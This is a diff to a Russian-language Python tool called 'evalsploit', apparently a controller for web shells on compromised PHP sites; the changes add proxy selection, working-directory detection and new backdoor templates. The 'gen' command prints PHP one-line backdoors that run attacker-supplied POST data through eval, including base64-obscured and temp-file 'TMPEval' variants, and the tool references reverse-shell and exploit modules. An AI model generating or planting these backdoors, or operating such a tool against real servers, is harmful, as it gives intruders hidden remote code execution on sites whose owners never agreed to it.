@@ -17,6 +17,7 @@ import modules.touch as tch
 import modules.stat as stat
 import modules.rename as rn
 import modules.set as settings
+import modules.proxy as proxy
 
 import bypasses.trybypass as by
 import bypasses.exec as run
@@ -26,7 +27,7 @@ import scan.sbd as sbd
 import exploits.reverse as rs
 import exploits.exploit as x
 
-version = "2.5.2"
+version = "2.6.0"
 config = configparser.ConfigParser()
 zed= config.read('settings.ini')
 shell =config['SETTINGS']['shell']
@@ -39,7 +40,6 @@ ts = config['SETTINGS']['send']
 a=[]
 who = []
 
-
 uagent = random.choice(open('useragents').read().splitlines())
 
 print("Введите заражённый url для коннекта")
@@ -47,12 +47,29 @@ print("Или оставьте поле пустым, чтобы восстан�
 
 test = input("URL@evalsploit~: ")
 
-if test == "": 
-    url = config['SETTINGS']['url']
+if test == "": url = config['SETTINGS']['url']
 else: 
     config['SETTINGS']['url'] = test
     with open('settings.ini', 'w') as configfile: config.write(configfile)
     url = test
+
+os.system('cls')
+
+print("Введите прокси")
+print("Или оставьте поле пустым, чтобы работать без них")
+while 1:
+    proxys = input("PROXY@evalsploit~: ")
+    if proxys == "": 
+        config['SETTINGS']['proxy'] = ""
+        with open('settings.ini', 'w') as configfile: config.write(configfile)
+        break
+    else: 
+        f = proxy.test(proxys) 
+        if f != "X":
+            config['SETTINGS']['proxy'] = proxys
+            with open('settings.ini', 'w') as configfile: config.write(configfile)
+            break
+        else: print('Прокси гавно')
 
 os.system('cls')
 
@@ -92,8 +109,10 @@ def hi():
     Модуль run:           {shell}
     Модуль reverse-shell: {reverse}
     Модуль send:          {ts}
-    Рабочая область:      {url}
-      ''')
+
+    ________________________________Общие данные_________________________________
+
+    Рабочая область:      {url}''')
     
 hi()
 
@@ -104,8 +123,11 @@ if silent != "1":
         print("    Или проблема с сервером. Крч я хз, сам решай")
         print("    Потом фикс выкачу")
     else:
-        pwd = send.send(url,"echo __DIR__;",uagent) # PWD
+        pwd = send.send(url,"echo __DIR__;",uagent) 
+        if pwd == "/tmp":
+            pwd = send.send(url,"echo getcwd();",uagent) # PWD
         statpwd = pwd
+        print(f"    Активная директория:  {pwd}")
         if execlist not in (""," "):
             print("    Сервер поддерживает:  "+execlist)
             if shell not in execlist:
@@ -119,12 +141,17 @@ else:
     pwd = "/var/www/"
     statpwd = pwd
     
-    print("    Включен тихий режим")
-    print("    Установлена домашняя директория по умолчанию: /var/www/")
-    print("    Чтобы установить директорию воспользуйтесь командой home")
+    print('''
+    Включен тихий режим")
+    Установлена домашняя директория по умолчанию: /var/www/")
+    Чтобы установить директорию воспользуйтесь командой home''')
 
-print("\n")    
 
+print()
+
+
+
+###_____ ОСНОВА _____###
 
 while True:
     
@@ -251,9 +278,21 @@ while True:
 #=============== GEN ===============# 
         case "gen": #Придумать распознование
             if ts == "bypass":
-                print('''\nif(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'], '' ,$_POST['Z'])));die();}\n''')
+                print('''
+Классический байпас: 
+if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'],'',$_POST['Z'])));die();}
+                      
+TMPEval:
+if(isset($_POST['Z'])){$f=tempnam(sys_get_temp_dir(),'');file_put_contents($f,"<?php \\n".base64_decode(str_replace($_POST['V'],'',$_POST['Z']))."\\n ?>");include_once($f);unlink($f);die();}
+''')
             if ts in ("classic","simple"):
-                print('''\nif(isset($_POST['Z'])){@eval($_POST['Z']);die();}\n''')
+                print('''
+Классика:
+if(isset($_POST['Z'])){@eval($_POST['Z']);die();}
+
+TMPEval:
+if(isset($_POST['Z'])){$f=tempnam(sys_get_temp_dir(),'');file_put_contents($f,"<?php \\n".$_POST['Z']."\\n ?>");include_once($f);unlink($f);die();}
+                      ''')
 
 #============= EXPLOIT =============# 
         case "exploit": #Крутая штука, привинтить к реверсу
